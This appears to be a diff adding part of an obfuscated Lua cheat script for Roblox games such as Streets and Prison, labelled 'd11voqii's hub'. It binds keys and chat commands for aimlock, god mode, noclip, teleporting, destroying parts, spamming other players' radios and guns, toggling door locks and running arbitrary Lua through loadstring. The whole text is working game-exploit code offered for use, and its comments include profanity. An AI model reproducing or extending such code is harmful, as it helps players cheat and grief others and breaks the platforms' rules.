+			local L_441_ = LP.Backpack:WaitForChild'BoomBox'
+			if L_441_ then 
+				L_441_.Parent = L_438_arg0
+				wait()
+				L_441_:FindFirstChildOfClass'RemoteEvent':FireServer("play", L_82_)
+				wait()
+				L_441_.Parent = LP.Backpack
+			end
+		end
+	end) -- code has stupid errors? pcall the fuck out of it
+end)
+
+UserInput.InputBegan:Connect(function(L_442_arg0)
+	local L_443_ = GetChar()
+	local L_444_ = L_443_:FindFirstChild'RealHumanoidRootPart' or L_443_:FindFirstChild'Torso'
+	local L_445_ = Mouse.Target
+	if not getfenv()['getgenv']()['loaded'] then
+		while true do
+		end
+	end
+	if UserInput:GetFocusedTextBox() then
+		return
+	end
+	if not L_443_:FindFirstChildOfClass'Tool' and L_48_ == "LeftClick" and L_442_arg0.UserInputType == Enum.UserInputType.MouseButton1 or L_48_ == "RightClick" and L_442_arg0.UserInputType == Enum.UserInputType.MouseButton2 then 
+		if L_445_ and L_445_.Parent then 
+			local L_446_ = L_445_.Parent 
+			if not L_2_:GetPlayerFromCharacter(L_446_) then
+				L_446_ = L_446_.Parent
+			end 
+			if not L_2_:GetPlayerFromCharacter(L_446_) then
+				return
+			end 
+			if L_446_ ~= L_443_ and L_446_ ~= L_71_ and L_9_ then 
+				L_71_ = L_446_
+				local L_447_;
+				L_447_ = L_2_:GetPlayerFromCharacter(L_446_).CharacterAdded:Connect(function(L_448_arg0)
+					if tostring(L_448_arg0) == tostring(L_71_) then 
+						L_71_ = L_448_arg0 
+					else
+						L_447_:Disconnect()
+						L_447_ = nil
+					end
+				end)
+				notif("d11voqii's hub", "aimlock target Has been set to " .. L_71_.Name, 5, nil)
+			end
+		end
+	end
+	if L_74_ then
+		local L_449_ = L_442_arg0.KeyCode.Name
+		if L_449_ ~= "Unknown" and L_449_ ~= "Return" and Keycode ~= "Slash" then
+			if L_74_ == "CmdBar" then
+				CmdBarKey = L_449_
+				notif("d11voqii's hub", "cmdbar key Has been set to the hotkey: " .. L_449_, 5, nil)
+				L_74_ = nil
+				L_111_.Visible = false
+			elseif L_74_ == "AnyCmd" and L_116_.Text ~= "" then
+				for L_450_forvar0, L_451_forvar1 in pairs(L_124_) do
+					if L_451_forvar1:match("[%a%d]+$") == L_449_ then
+						table.remove(L_124_, L_450_forvar0)
+					end
+				end
+				L_124_[# L_124_ + 1] = L_116_.Text .. "||" .. L_449_
+				notif(L_116_.text, "Has been set to the hotkey: " .. L_449_, 5, nil)
+				L_74_ = nil
+				L_116_.Text = ""
+				L_111_.Visible = false
+			end
+			updateHotkeys(L_51_)
+		end 
+	end
+	if L_445_ and L_442_arg0.UserInputType == Enum.UserInputType.MouseButton2 then 
+		local L_452_ = L_445_.Parent
+		if L_452_ and L_452_:FindFirstChild'Click' and L_452_:FindFirstChild'Locker' then 
+			if L_452_.Locker.Value then 
+				L_452_.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+				L_452_.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+			else
+				L_452_.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+				L_452_.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+			end
+		end
+	end
+	if L_76_ and L_76_ ~= "" and L_442_arg0.KeyCode == Enum.KeyCode[L_76_:upper()] and L_445_ then 
+		Teleport(CFrame.new(Mouse.Hit.p + Vector3.new(0, 5, 0)))
+	end
+	for L_453_forvar0, L_454_forvar1 in pairs(L_124_) do
+		local L_455_ = L_139_func(L_454_forvar1:match'[%a%d]+$')
+		if L_455_ == L_442_arg0.KeyCode then
+			CheckCommand(L_454_forvar1:match'^[%w%s]+')
+		end
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.LeftControl then
+		L_136_['Control'] = true
+		if L_14_ then
+			L_96_.Size = Vector3.new(0, 0, 0)
+		end
+		if L_38_ and L_60_ == 8 then
+			return
+		end
+		L_443_.Humanoid.WalkSpeed = L_60_
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.LeftShift then 
+		L_136_['Shift'] = true
+		if L_38_ and L_64_ == 25 then
+			return
+		end
+		L_443_.Humanoid.WalkSpeed = L_64_
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.W then 
+		L_136_['W'] = true
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.A then 
+		L_136_['A'] = true
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.S then 
+		L_136_['S'] = true
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.D then 
+		L_136_['D'] = true
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.Space then 
+		if L_14_ then
+			L_444_.CFrame = L_444_.CFrame + Vector3.new(0, 5, 0)
+		end
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode.E and L_443_:FindFirstChildOfClass'Tool' and L_443_:FindFirstChildOfClass'Tool':FindFirstChild'Clips' and not L_443_:FindFirstChild('Bone', true) and L_33_ then 
+		if game.PlaceId == 455366377 then 
+			local L_456_ = L_443_:FindFirstChildOfClass'Tool'
+			L_456_.Parent = LP.Backpack
+			wait()
+			local L_457_ = LP.Backpack.Punch
+			L_457_.Parent = L_443_
+			LP.Backpack.Input:FireServer("e", {})
+			wait(1)
+			L_457_.Parent = LP.Backpack
+			wait()
+			L_456_.Parent = L_443_
+		else
+			LP.Backpack.ServerTraits.Finish:FireServer(LP.Backpack.Punch)
+		end 
+	end
+	if L_442_arg0.KeyCode == Enum.KeyCode[CmdBarKey] then
+		wait()
+		L_101_:CaptureFocus()
+		L_100_:TweenPosition(UDim2.new(0.5, 0, 0.5, 0), "In", "Sine", 0.5, true)
+		local L_458_ = UserInput.TextBoxFocusReleased:Wait()
+		CheckCommand(L_458_.Text)
+		L_458_.Text = ""
+		L_100_:TweenPosition(UDim2.new(1.5, 0, 1.5, 0), "Out", "Quad", 0.5, true)
+	end
+	if L_443_:FindFirstChild'GravGun' then 
+		if L_442_arg0.KeyCode == Enum.KeyCode.Q and L_59_ > 5 then 
+			L_59_ = L_59_ - 5
+		end
+		if L_442_arg0.KeyCode == Enum.KeyCode.V then 
+			L_59_ = L_59_ + 5
+		end
+		if L_442_arg0.KeyCode == Enum.KeyCode.B then 
+			L_34_ = not L_34_
+			notif("d11voqii's hub", "WOW! You found Grav gun seizure mode!, it has been set to " .. tostring(L_34_), 5, 'rbxassetid://5929642434')
+		end
+	end 
+end)
+
+UserInput.InputEnded:Connect(function(L_459_arg0)
+	local L_460_ = GetChar()
+	if UserInput:GetFocusedTextBox() then
+		return
+	end
+	if L_459_arg0.KeyCode == Enum.KeyCode.W then 
+		L_136_['W'] = false
+	end
+	if L_459_arg0.KeyCode == Enum.KeyCode.A then 
+		L_136_['A'] = false
+	end
+	if L_459_arg0.KeyCode == Enum.KeyCode.S then 
+		L_136_['S'] = false
+	end
+	if L_459_arg0.KeyCode == Enum.KeyCode.D then 
+		L_136_['D'] = false
+	end
+	if L_459_arg0.KeyCode == Enum.KeyCode.LeftShift and L_64_ then
+		L_136_['Shift'] = false 
+		if L_38_ and L_64_ == 25 then
+			return
+		end 
+		L_460_.Humanoid.WalkSpeed = L_62_
+	end 
+	if L_459_arg0.KeyCode == Enum.KeyCode.LeftControl then 
+		L_136_['Control'] = false
+		if L_14_ then
+			L_96_.Size = Vector3.new(5, 1, 5)
+		end
+		if L_38_ and L_60_ == 8 then
+			return
+		end
+		L_460_.Humanoid.WalkSpeed = L_62_
+	end
+end)
+
+UserInput.JumpRequest:Connect(function()
+	local L_461_ = GetChar()
+	if L_461_:FindFirstChildOfClass'Humanoid' and L_25_ then 
+		L_461_.Humanoid:ChangeState(3)
+	end
+end)
+
+LP.Idled:Connect(function()
+	VirtualUser:CaptureController()
+	VirtualUser:ClickButton1(Vector2.new(0.5, 0.5))
+end)
+
+Mouse.Button1Down:Connect(function()
+	local L_462_ = Mouse.Target
+	if L_462_ and GetChar():FindFirstChild'Zetox Btools' then 
+		L_462_:Destroy()
+	end
+	if L_462_ and GetChar():FindFirstChild'GravGun' then
+		local L_463_ = L_462_.Parent:FindFirstChild'Head' or L_462_.Parent.Parent:FindFirstChild'Head' or L_462_
+		if L_2_:GetPlayerFromCharacter(L_463_.Parent) or not L_463_.Anchored then
+			L_78_ = L_142_func(L_463_)
+		end 
+	end
+	if not getfenv()['getgenv']()['loaded'] then
+		while true do
+		end
+	end
+	if L_24_ and GetChar():FindFirstChildOfClass'Tool' and GetChar():FindFirstChildOfClass'Tool':FindFirstChild('Clips', true) and not L_23_ then
+		L_23_ = true 
+		GetChar().Humanoid:UnequipTools()
+		local L_464_;
+		for L_465_forvar0, L_466_forvar1 in pairs(LP.Backpack:GetChildren()) do 
+			if L_466_forvar1:IsA'Tool' and L_466_forvar1:FindFirstChild('Clips', true) then 
+				L_466_forvar1.Parent = GetChar()
+				L_464_ = L_466_forvar1
+				LP.Backpack.Input:FireServer("ml", {
+					['mousehit'] = L_9_ and L_71_ and L_168_func() or Mouse.Hit;
+					['shift'] = UserInput:IsKeyDown(Enum.KeyCode.LeftShift);
+					['velo'] = 0;
+				})
+				wait(0.3)
+				L_466_forvar1.Parent = LP.Backpack
+				wait(0.3)
+			end 
+		end
+		L_464_.Parent = GetChar()
+		L_23_ = false
+	end
+end)
+
+Mouse.Button1Up:Connect(function()
+	if L_78_ then 
+		L_78_:Destroy()
+	end
+	if L_79_ then 
+		L_79_:Destroy()
+	end
+end)
+
+L_2_.PlayerAdded:Connect(function(L_467_arg0)
+	if L_130_[L_467_arg0.UserId] then -- SHUT UP EST I'M TIRED
+		print(1)
+		L_467_arg0.Chatted:Connect(function(L_469_arg0)
+			L_138_func(L_467_arg0, L_469_arg0)
+		end)
+	end 
+	L_467_arg0.CharacterAdded:Connect(function(L_470_arg0)
+		local L_471_ = L_470_arg0:WaitForChild('Head', 10)
+		if L_471_ then 
+			if L_48_ == "Closest" then 
+				L_144_func(L_467_arg0)
+			end 
+			local L_472_ = L_130_[L_467_arg0.UserId]
+			local L_473_ = L_131_[L_467_arg0.UserId]
+			if L_473_ or L_467_arg0:IsInGroup(5152759) or string.find(L_467_arg0.Name:lower(), "lynx") then
+				L_148_func(L_467_arg0.Character.Head, L_467_arg0.Name, Color3.fromRGB(102, 51, 0), true)
+				L_467_arg0.CharacterAdded:Connect(function(L_474_arg0)
+					local L_475_ = L_474_arg0:WaitForChild'Head'
+					if L_475_ then 
+						L_148_func(L_475_, L_467_arg0.Name, Color3.fromRGB(102, 51, 0), true)
+					end 
+				end)
+			end 
+			if L_472_ then 
+				L_148_func(L_467_arg0.Character.Head, L_472_['Name'], L_472_['Colour'])
+				L_141_func(L_467_arg0, L_472_['Colour'])
+				L_467_arg0.CharacterAdded:Connect(function(L_476_arg0)
+					local L_477_ = L_476_arg0:WaitForChild'Head'
+					if L_477_ then
+						L_141_func(L_467_arg0, L_472_['Colour'])
+						L_148_func(L_477_, L_472_['Name'], L_472_['Colour'])
+					end
+				end)
+			end
+		end
+	end)
+	local L_468_;
+	L_468_ = L_467_arg0.Chatted:Connect(function(L_478_arg0)
+		local L_479_ = L_150_func(L_467_arg0, L_478_arg0)
+		if L_479_ then 
+			L_468_:Disconnect()
+		end
+	end)
+end)
+
+L_112_.MouseButton1Click:Connect(function()
+	L_74_ = "AnyCmd"
+	if L_116_.Text == "" then
+		L_112_.Text = "Type a command above"
+	else 
+		L_112_.Text = "Press a Key"
+	end 
+end)
+
+L_115_.MouseButton1Click:Connect(function()
+	L_74_ = "CmdBar" 
+end)
+
+L_2_.PlayerRemoving:Connect(function(L_480_arg0)
+	if L_121_[tostring(L_480_arg0)] then 
+		L_121_[tostring(L_480_arg0)] = nil
+	end
+	if tostring(L_480_arg0) == tostring(L_71_) then 
+		L_71_ = nil
+	end
+	if L_480_arg0 == L_81_ then 
+		L_28_ = false 
+		L_81_ = nil
+	end 
+	if L_480_arg0 == L_73_ then
+		L_43_ = false
+		L_11_ = false 
+		L_73_ = nil
+		L_6_ = false
+		L_29_ = false
+		L_13_ = false
+		L_71_ = nil
+	end
+	L_147_func(L_480_arg0)
+end)
+
+L_101_:GetPropertyChangedSignal("Text"):Connect(function()
+	pcall(function()
+		if L_101_.Text ~= "" or L_101_.Text ~= " " then 
+			local L_481_ = 0 
+			local L_482_ = L_100_:GetChildren()
+			for L_483_forvar0 = 1, # L_482_ do 
+				local L_484_ = L_482_[L_483_forvar0]
+				if L_484_:IsA'TextLabel' then
+					local L_485_ = string.lower(L_484_.Text):gsub("[Alias] ", "")
+					if string.find(L_485_, L_101_.Text:lower()) then
+						L_484_.Position = UDim2.new(0, 0, 0, 10 + (L_481_ * 20))
+						L_481_ = L_481_ + 1
+						if L_481_ >= 7 then
+							L_484_.Position = UDim2.new(0, 0, 0, 1000)
+							L_481_ = L_481_ - 1
+						end
+					else 
+						L_484_.Position = UDim2.new(0, 0, 0, 1000)
+					end
+				end
+			end
+		end
+	end)
+end)
+
+L_101_.FocusLost:Connect(function(L_486_arg0)
+	L_100_:TweenPosition(UDim2.new(1.5, 0, 1.5, 0), "Out", "Quad", 0.5, true)
+	if L_486_arg0 then
+		CheckCommand(L_101_.Text)
+		L_101_.Text = "" -- stop double executing 
+	end
+end)
+
+-- [[ End ]] --
+
+-- [[ Commands ]] -- 
+
+AddCommand(function()
+	L_97_.Visible = not L_97_.Visible
+end, "help", {
+	"cmds",
+	"commands"
+}, "Gives you help info", "[No Args]")
+
+AddCommand(function(L_487_arg0)
+	L_10_ = not L_10_
+	notif("d11voqii's hub", "auto alias Has been set to " .. tostring(L_10_), 5, nil)
+end, "usealiases", {
+	"usealias"
+}, "Turns On/Off Aliases", "[No Args]")
+
+AddCommand(function(L_488_arg0)
+	Instance.new('Tool', LP.Backpack).Name = "Zetox Btools"
+end, "btools", {}, "Gives you btools", "[No Args]")
+
+AddCommand(function(L_489_arg0)
+	if L_489_arg0[1] then
+		if L_489_arg0[1] == "normal" then 
+			workspace.CurrentCamera.FieldOfView = 70 
+		elseif tonumber(L_489_arg0[1]) then 
+			workspace.CurrentCamera.FieldOfView = L_489_arg0[1]
+		end
+	end
+end, "fieldofview", {
+	"fov"
+}, "Changes Field of View", "[Number/Normal]")
+
+AddCommand(function(L_490_arg0)
+	if not loadstring then
+		notif("d11voqii's hub", "Aborting the command", 5, nil)
+		return
+	end -- whoever made this if statemenet forgot a RETURN
+	if L_490_arg0[1] then 
+		loadstring(table.concat(L_490_arg0, " "))()
+	end
+end, "luacode", {
+	"exec",
+	"lua"
+}, "Executes Lua code", "[Code]")
+
+AddCommand(function()
+	local L_491_ = {}
+	for L_492_forvar0 = 1, 10 do 
+		local L_493_ = HttpService:JSONDecode(game:HttpGet("https://www.roblox.com/games/getgameinstancesjson?placeId=" .. game.PlaceId .. "&startindex=" .. L_492_forvar0))
+		for L_494_forvar0 = 1, # L_493_.Collection do 
+			local L_495_ = L_493_.Collection[L_494_forvar0]
+			L_491_[L_495_.Ping] = L_495_.Guid
+		end
+		for L_496_forvar0, L_497_forvar1 in pairs(L_491_) do 
+			if L_497_forvar1 ~= game.JobId then 
+				TeleportService:TeleportToPlaceInstance(game.PlaceId, L_497_forvar1)
+				break
+			end
+		end
+	end
+end, "serverhop", {}, "Hops servers of your current game", "[No Args]")
+
+AddCommand(function(L_498_arg0)
+	if L_498_arg0[1] and tonumber(L_498_arg0[1]) then
+		L_46_ = true
+		L_38_ = true 
+		L_62_ = L_498_arg0[1]
+		GetChar().Humanoid.WalkSpeed = L_498_arg0[1]
+	end
+end, "speed", {
+	"ws"
+}, "Changes walkspeed", "[Number]")
+
+AddCommand(function(L_499_arg0)
+	if L_499_arg0[1] and tonumber(L_499_arg0[1]) then
+		L_38_ = false 
+		L_64_ = L_499_arg0[1]
+		updateHotkeys(L_51_)
+	end 
+end, "sprintspeed", {
+	"sspeed"
+}, "Changes sprinting speed", "[Number]")
+
+AddCommand(function(L_500_arg0)
+	if L_500_arg0[1] and tonumber(L_500_arg0[1]) then
+		L_38_ = false 
+		L_60_ = L_500_arg0[1]
+		updateHotkeys(L_51_)
+	end 
+end, "crouchspeed", {
+	"cspeed"
+}, "Changes crouching speed", "[Number]")
+
+AddCommand(function(L_501_arg0)
+	if L_501_arg0[1] and tonumber(L_501_arg0[1]) then
+		GetChar().Humanoid.JumpPower = L_501_arg0[1] 
+	end
+end, "jumppower", {
+	"jp"
+}, "Changes JumpPower", "['Number]")
+
+AddCommand(function(L_502_arg0)
+	if L_502_arg0[1] and tonumber(L_502_arg0[1]) then 
+		GetChar().Humanoid.HipHeight = L_502_arg0[1]
+	end	
+end, "hipheight", {
+	"hh"
+}, "Changes HipHeight", "[Number]")
+
+AddCommand(function(L_503_arg0)
+	if L_503_arg0[1] then 
+		if tonumber(L_503_arg0[1]) then
+			workspace.Gravity = tonumber(L_503_arg0[1])
+		elseif L_503_arg0[1] and L_503_arg0[1] == "normal" then 
+			workspace.Gravity = L_68_
+		end
+	end 
+end, "gravity", {
+	"grav"
+}, "Changes gravity", "[Number/Normal]")
+
+AddCommand(function(L_504_arg0)
+	local L_505_ = GetChar()
+	if L_504_arg0[1] then 
+		if L_504_arg0[1] == "ws" or L_504_arg0[1] == "speed" then 
+			L_505_.Humanoid.WalkSpeed = L_504_arg0[2] and tonumber(L_504_arg0[2]) or L_63_
+			L_86_ = L_504_arg0[2] and tonumber(L_504_arg0[2]) or L_63_
+			L_62_ = L_504_arg0[2] and tonumber(L_504_arg0[2]) or L_63_
+		elseif L_504_arg0[1] == "jp" or L_504_arg0[1] == "jumppower" then 
+			L_505_.Humanoid.JumpPower = L_504_arg0[2] and tonumber(L_504_arg0[2]) or L_66_
+			L_87_ = L_504_arg0[2] and tonumber(L_504_arg0[2]) or L_66_
+		elseif L_504_arg0[1] == "hh" or L_504_arg0[1] == "hipheight" then 
+			L_505_.Humanoid.HipHeight = L_504_arg0[2] and tonumber(L_504_arg0[2]) or L_55_
+			L_55_ = L_504_arg0[2] and tonumber(L_504_arg0[2]) or L_55_
+		end
+	end
+end, "loop", {
+	"spawn"
+}, "Spawns you with that [Speed/JumpPower/HipHeight]", "[jp/hh/ws [Number]]")
+
+AddCommand(function(L_506_arg0)
+	local L_507_ = GetChar():FindFirstChildOfClass'Tool'
+	if not L_507_ then
+		notif("d11voqii's hub", "Hold a tool then run the command again", 5, nil)
+		return
+	end
+	L_507_.Parent = LP.Backpack
+	L_507_.Grip = CFrame.new(L_506_arg0[1] or 0, L_506_arg0[2] or 0, L_506_arg0[3] or 0) + Vector3.new(L_506_arg0[4] or 0, L_506_arg0[5] or 0, L_506_arg0[6] or 0)
+	L_507_.Parent = GetChar()
+end, "grippos", {
+	"grip"
+}, "Changes your tool .Grip", "[6 Numbers (Optional)]")
+
+AddCommand(function(L_508_arg0)
+	L_39_ = not L_39_
+	notif("d11voqii's hub", "noGH Has been set to " .. tostring(L_39_), 5, nil)
+end, "nogroundhit", {
+	"nogh",
+	"antigh",
+	"antigroundhit"
+}, "Can't be groundhit", "[No Args]")
+
+AddCommand(function(L_509_arg0)
+	if game.PlaceId ~= 4669040 then
+		notif("d11voqii's hub", "this only works on prison.", 5, nil)
+		return
+	end 
+	L_12_ = not L_12_
+end, "alwaysgh", {
+	"alwaysgroundhit"
+}, "Beat people up like the school bully did to you when you were 13!", "[No Args]")
+
+AddCommand(function()
+	local L_510_ = LP.PlayerGui.HUD:GetChildren()
+	for L_511_forvar0 = 1, # L_510_ do 
+		local L_512_ = L_510_[L_511_forvar0]
+		if L_512_:IsA'Frame' then 
+			L_512_.Active = not L_512_.Active 
+			L_512_.Draggable = not L_512_.Draggable 
+		end
+	end
+end, "draggablegui", {}, "Makes your HUD draggable", "[No Args]")
+
+AddCommand(function(L_513_arg0)
+	if not L_513_arg0[1] then 
+		L_32_ = not L_32_
+		if L_32_ then
+			if game.PlaceId == 455366377 then
+				notif("d11voqii's hub", "make sure you don't get dragged and like fly away somewhere when you get up you will be godded", 5, nil)
+			end 
+		end
+		if game.PlaceId ~= 455366377 then
+			GetChar():BreakJoints()
+		end 
+		notif("d11voqii's hub", "god mode Has been set to " .. tostring(L_32_), 5, nil)
+	end
+end, "godmode", {
+	"god"
+}, "Turns on god-mode so you can't be hit (Breaks Tools)", "[No Args]")
+
+AddCommand(function(L_514_arg0)
+	local L_515_ = game:GetDescendants()
+	for L_516_forvar0 = 1, tonumber(L_514_arg0[1]) or 50 do 
+		local L_517_ = L_515_[L_516_forvar0]
+		if L_517_:IsA'Tool' and L_517_:FindFirstChild'Click' then 
+			L_517_.Click:FireServer()
+			wait()
+		end
+	end
+end, "spamclick", {}, "Spam clicks a fuck ton of guns to be very annoying", "[Number (Optional)]")
+
+AddCommand(function()
+	local L_518_ = workspace:GetChildren()
+	for L_519_forvar0 = 1, # L_518_ do
+		local L_520_ = L_518_[L_519_forvar0]
+		if L_520_.Name == "Door" and L_520_:FindFirstChild'Click' and L_520_:FindFirstChild'Lock' then 
+			L_520_.Lock.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+			L_520_.Click.ClickDetector:FindFirstChildOfClass'RemoteEvent':FireServer()
+		end
+	end
+end, "doors", {}, "Unlocks/Locks doors", "[No Args]")
+
+AddCommand(function(L_521_arg0)
+	L_41_ = not L_41_
+	if L_521_arg0[1] then 
+		L_50_ = table.concat(L_521_arg0, " ")
+	end
+end, "spam", {}, "Spams the message that you set", "[Message To Spam]")
+
+AddCommand(function(L_522_arg0)
+	if L_522_arg0[1] then 
+		L_56_ = tonumber(L_522_arg0[1]) or 1
+	end 
+end, "spamdelay", {}, "Changes the spam delay amount", "[Number]")
+
+AddCommand(function(L_523_arg0)
+	local L_524_ = game:GetDescendants()
+	for L_525_forvar0 = 1, 10 do 
+		for L_526_forvar0 = 1, # L_524_ do
+			local L_527_ = L_524_[L_526_forvar0]
+			if L_527_:IsA'Tool' and L_527_:FindFirstChild'Click' then 
+				L_527_.Click:FireServer()
+			end
+		end
+	end
+end, "muteallradios", {
+	"muteradios"
+}, "Mutes all radios (Doesn't loop)", "[No Args]")
+
+AddCommand(function(L_528_arg0)
+	if not L_528_arg0[1] then 
+		TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId)
+	end
+end, "rejoin", {
+	"rj"
+}, "Rejoins the current game server", "[No Args]")
+
+AddCommand(function(L_529_arg0)
+	if not L_529_arg0[1] then 
+		GetChar():BreakJoints()
+	end 
+end, "reset", {
+	"re"
+}, "Kills your Player", "[No Args]")
+
+AddCommand(function()
+	L_14_ = not L_14_
+	L_96_.Parent = L_14_ and workspace or not L_14_ and nil 
+end, "airwalk", {}, "Allows you to walk in the air", "[No Args]")
+
+AddCommand(function()
+	L_37_ = not L_37_
+	if L_37_ then 
+		local L_530_ = workspace:GetDescendants()
+		for L_531_forvar0 = 1, # L_530_ do 
+			local L_532_ = L_530_[L_531_forvar0]
+			if string.find(L_532_.ClassName:lower(), "seat") then
+				L_532_.Parent = CoreGui
+			end
+		end
+	else
+		local L_533_ = CoreGui:GetDescendants() 
+		for L_534_forvar0 = 1, # L_533_ do 
+			local L_535_ = L_533_[L_534_forvar0]
+			if string.find(L_535_.ClassName:lower(), "seat") then 
+				L_535_.Parent = workspace
+			end
+		end
+	end
+end, "neversit", {
+	"nsit"
+}, "Toggles the possibility of you being able to sit down", "[No Args]")
+
+AddCommand(function()
+	L_13_ = not L_13_
+	notif("d11voqii's hub", "antiKO Has been set to " .. tostring(L_13_), 5, nil)
+end, "noko", {
+	"antiko",
+	"autodie",
+	"autoreset"
+}, "Auto resets when you get KO'ed", "[No Args]")
+
+AddCommand(function()
+	L_40_ = not L_40_
+	notif("d11voqii's hub", "noclip Has been set to " .. tostring(L_40_), 5, nil)
+end, "noclip", {}, "Allows you to walk through walls and stuff", "[No Args]")
+
+AddCommand(function(L_536_arg0)
+	if L_536_arg0[1] then 
+		local L_537_ = PlrFinder(L_536_arg0[1])
+		if L_537_ and L_537_.Character and L_537_.Character:FindFirstChild'Head' and L_537_ ~= LP then 
+			Teleport(L_537_.Character.Head.CFrame)
+		end
+	end
+end, "goto", {
+	"to"
+}, "Teleports you to a player", "[Player Name]")
+
+AddCommand(function(L_538_arg0)
+	if L_538_arg0[1] and tonumber(L_538_arg0[1]) then 
+		L_77_ = L_538_arg0[1]
+	else
+		L_77_ = nil 
+	end
+end, "time", {}, "Changes the time", "[Number]")
+
+AddCommand(function(L_539_arg0)
+	if L_539_arg0[1] then 
+		local L_540_ = PlrFinder(L_539_arg0[1])
+		if L_540_ then 
+			notif(L_540_.Name, "has the account age of " .. L_540_.AccountAge, 5, nil)
+		end
+	end
+end, "playerinfo", {
+	"info"
+}, "Returns a players age", "[No Args]")
+
+AddCommand(function(L_541_arg0)
+	L_7_ = not L_7_
+	if not L_7_ then
+		L_153_func("215384594")
+		L_153_func("188632011")
+		for L_542_forvar0, L_543_forvar1 in pairs(GetChar().Torso:GetChildren()) do 
+			if L_543_forvar1:IsA'BodyVelocity' and L_543_forvar1.Name ~= "CyAdminFly" then 
+				L_543_forvar1:Destroy()
+			end 
+		end 
+	else
+		for L_544_forvar0 = 1, 500 do
+			local L_545_ = Instance.new("BodyVelocity", GetChar().Torso)
+			L_545_.MaxForce = Vector3.new(100, 100, 100)
+			L_545_.P = math.huge
+			L_545_.Velocity = Vector3.new(math.huge, math.huge, math.huge)
+		end
+		if L_541_arg0[1] and L_541_arg0[1] == "spin" then
+			local L_546_ = GetChar().Humanoid:LoadAnimation(L_93_)
+			while L_7_ and GetChar():FindFirstChild'Humanoid' and GetChar().Humanoid.Health > 0 and wait() do
+				L_153_func("188632011")
+				L_546_:play(0.1, 1, 10)
+			end
+		else
+			L_153_func("215384594")
+			L_153_func("188632011")
+			GetChar().Humanoid:LoadAnimation(L_90_):Play(5, 45, 250)
+		end 
+	end 
+end, "antiaim", {}, "Breaks camlock to an extent", "[Spin/No Args]")
+
+AddCommand(function()
+	local L_547_ = GetChar():FindFirstChild'Punch'
+	if L_547_ then 
+		if L_547_.Grip == CFrame.new(math.huge, math.huge, math.huge) then
+			L_547_.Parent = LP.Backpack
+			L_547_.Grip = CFrame.new(0, 0, 0)
+			wait()
+			L_547_.Parent = GetChar()
+			notif("d11voqii's hub", "super punch Turned off", 5, nil)
+		else
+			L_547_.Parent = LP.Backpack
+			L_547_.Grip = CFrame.new(math.huge, math.huge, math.huge)
+			wait()
+			L_547_.Parent = GetChar()
+			notif("d11voqii's hub", "super punch Turned on (Lasts one life also really buggy)", 5, nil)
+		end
+	else 
+		notif("d11voqii's hub", "Hold your fists", 5, nil)
+	end 
+end, "superpunch", {}, "This is really stupid and buggy but funny when it works", "[No Args]")
+
+AddCommand(function(L_548_arg0)
+	if L_548_arg0[1] then
+		if L_548_arg0[1] == "1" then
+			L_52_ = "1"
+		elseif L_548_arg0[1] == "2" then 
+			L_52_ = "2"
+		elseif L_548_arg0[1] == "off" then 
+			L_52_ = "None"
+		else 
+			notif("d11voqii's hub", "Only Gunanim [1/2/Off] works")
+			return
+		end 
+		notif("d11voqii's hub", "GunAnim Has been set to " .. L_52_, 5, nil)
+	end 
+end, "gunanim", {}, "Stupid gun animations (gunanim [1/2/off])", "[1/2/off]")
+
+AddCommand(function(L_549_arg0)
+	if L_549_arg0[1] then
+		L_153_func("33796059")
+		L_153_func("35654637")
+		if L_549_arg0[1] == "1" then 
+			GetChar().Humanoid:LoadAnimation(L_91_):Play()
+		elseif L_549_arg0[1] == "2" then 
+			GetChar().Humanoid:LoadAnimation(L_92_):Play()
+		elseif L_549_arg0[1] == "off" then 
+			L_153_func("33796059")
+			L_153_func("35654637")
+		end 
+	end
+end, "dance", {}, "Stupid dance anims (1,2,Off)", "[Dance 1/Dance 2/Off]")
+
+AddCommand(function(L_550_arg0)
+	if L_550_arg0[1] then 
+		if L_550_arg0[1] == "head" then 
+			L_49_ = "Head"
+		elseif L_550_arg0[1] == "torso" then 
+			L_49_ = "Torso"
+		end
+		notif("d11voqii's hub", "camlock target Has been set to " .. L_49_, 5, nil)
+	end
+end, "camlocktarget", {
+	"cltarget"
+}, "Head,Torso to switch the camlock target", "[Head/Torso]")
+
+AddCommand(function()
+	if game.PlaceId ~= 455366377 then
+		notif("d11voqii's hub", "Streets Only", 5, nil)
+		return
+	end
+	math.randomseed(os.time())
+	if workspace:FindFirstChild'Cars' then
+		local L_551_ = GetChar():FindFirstChild'RealHumanoidRootPart' or GetChar():FindFirstChild'Torso'
+		local L_552_ = workspace.Cars:GetDescendants()
+		for L_553_forvar0 = 1, # L_552_ do 
+			local L_554_ = math.random(1, # L_552_)
+			local L_555_ = L_552_[L_554_]
+			if L_555_:IsA'VehicleSeat' and L_555_.Name == "Drive" and not L_555_.Occupant then
+				L_551_.CFrame = L_555_.CFrame
+			end
+		end
+	else
+		notif("d11voqii's hub", "no cars to bring try again later", 5, nil)
+	end
+end, "bringcar", {}, "Brings a car (Normal TS only", "[No Args]")
+
+AddCommand(function()
+	if game.PlaceId ~= 455366377 then
+		notif("d11voqii's hub", "Streets Only", 5, nil)
+		return
+	end
+	if L_42_ then
+		notif("d11voqii's hub", "you can not use burgers/drinks with the tpbypass")
+		return
+	end
+	if L_154_func("burger", GetChar().Head.CFrame) then
+		local L_556_ = LP.Backpack:FindFirstChild'Burger'
+		if L_556_ then 
+			L_556_.Parent = GetChar()
+			L_556_:Activate() -- CHEEMS
+			repeat
+				RunService.Heartbeat:Wait()
+			until L_556_.Parent ~= LP.Character
+		end
+	end
+	if L_154_func("drink", GetChar().Head.CFrame) then
+		local L_557_ = LP.Backpack:FindFirstChild'Drink'
+		if L_557_ then 
+			L_557_.Parent = GetChar()
+			L_557_:Activate()
+		end 
+	end
+end, "heal", {
+	"h"
+}, "Heals you (Duh?)", "[No Args]", "[No Args]")
+
